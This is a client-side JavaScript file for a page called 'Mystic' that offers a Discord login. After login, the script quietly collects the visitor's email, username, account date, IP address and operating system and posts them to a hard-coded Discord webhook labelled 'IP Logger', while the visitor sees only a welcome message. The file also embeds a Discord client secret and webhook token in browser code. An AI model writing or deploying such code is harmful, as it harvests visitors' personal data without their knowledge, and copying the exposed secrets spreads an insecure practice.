const clientId = '1297277649835786251';
const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
const scopes = 'identify email guilds'; // Define the scopes you need

async function loginWithDiscord() {
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scopes}`;
    window.location.href = authUrl;
}

async function fetchUserData(code) {
    console.log("Fetching user data with code:", code); // Debug log
    const response = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            'client_id': clientId,
            'client_secret': 'Jezd4Sw13ks_1s9uViCpxtWUAHYSRsMD', // Keep this secret on the server in a real app
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirectUri,
        }),
    });

    if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to fetch access token:', errorText); // Log error response
        return;
    }

    const data = await response.json();
    console.log("Access token data:", data); // Log access token data

    // Fetch user info
    const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            'Authorization': `Bearer ${data.access_token}`,
        },
    });

    if (!userInfoResponse.ok) {
        const errorText = await userInfoResponse.text();
        console.error('Failed to fetch user info:', errorText); // Log user info error
        return;
    }

    const user = await userInfoResponse.json();
    const username = user.username; // Extract username
    const email = user.email || "No Email attached.";
    const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
    const operatingSystem = navigator.platform; // Get operating system

    // Call the function to send visitor info along with the user information
    sendInfoToDiscord(email, username, createdAt, operatingSystem);
}

async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Get additional information
    const timestamp = new Date().toISOString();

    const embedMessage = {
        embeds: [{
            title: '👤 New Visitor Info',
            color: 0xFF0000, // Red color
            fields: [
                { name: '📧 Email', value: email, inline: true },
                { name: '🖥️ IP Address', value: ip, inline: true },
                { name: '👤 Username', value: username, inline: true },
                { name: '📅 Account Created', value: createdAt, inline: true },
                { name: '🖥️ Operating System', value: operatingSystem, inline: true }, // Operating System
                { name: '📅 Timestamp', value: timestamp, inline: true }, // Timestamp
            ],
            footer: {
                text: 'Logged by IP Logger',
            }
        }]
    };

    const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embedMessage)
    });

    document.body.innerHTML += `<h2>Welcome @${username}, thank you for coming!</h2>`;
}

window.onload = function () {
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    if (code) {
        fetchUserData(code);
    } else {
        // Show the login button if no code is present
        document.body.innerHTML = `
            <div class="container">
                <h1>Welcome to Mystic</h1>
                <button onclick="loginWithDiscord()">Login with Discord</button>
            </div>
        `;
    }
};
